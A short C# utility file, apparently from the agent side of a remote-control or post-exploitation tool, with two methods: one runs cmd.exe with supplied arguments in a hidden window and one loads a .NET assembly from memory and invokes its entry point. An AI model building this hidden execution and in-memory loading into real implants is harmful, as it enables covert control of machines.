using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Agent.Utils
{
    public static class Execute
    {
        public static string ExecuteCommand(string file, string args)
        {
            var startInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = args,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            var proc = new Process
            {
                StartInfo = startInfo

            };
            string output = "";


            proc.OutputDataReceived += (_, e) => output += $"{e.Data}\n";
            proc.ErrorDataReceived += (_, e) => output += $"{e.Data}\n";

            proc.Start();
            proc.BeginOutputReadLine();
            proc.BeginErrorReadLine();

            proc.WaitForExit();
            return output;
        }

        public static string ExecuteAssembly(byte[] asm, string[] args = null)
        {

            if (args is null)
                    args = new string[]{};
            // save current stdout, stderr
            var currOut = Console.Out;
            var currErr = Console.Error;
            
            // redirect output to capture asm outputs
            var ms = new MemoryStream();
            var sw = new StreamWriter(ms);
            sw.AutoFlush = true;
            Console.SetOut(sw);
            Console.SetError(sw);
            
            var assembly = Assembly.Load(asm);
            assembly.EntryPoint.Invoke(null, new object[] { args });

            Console.Out.Flush();
            Console.Error.Flush();

            // save output and undo the changes in stdout, stderr
            var output = Encoding.UTF8.GetString(ms.ToArray());

            Console.SetOut(currOut);
            Console.SetError(currErr);

            sw.Dispose();
            ms.Dispose();
            return output;
        }
    }
}
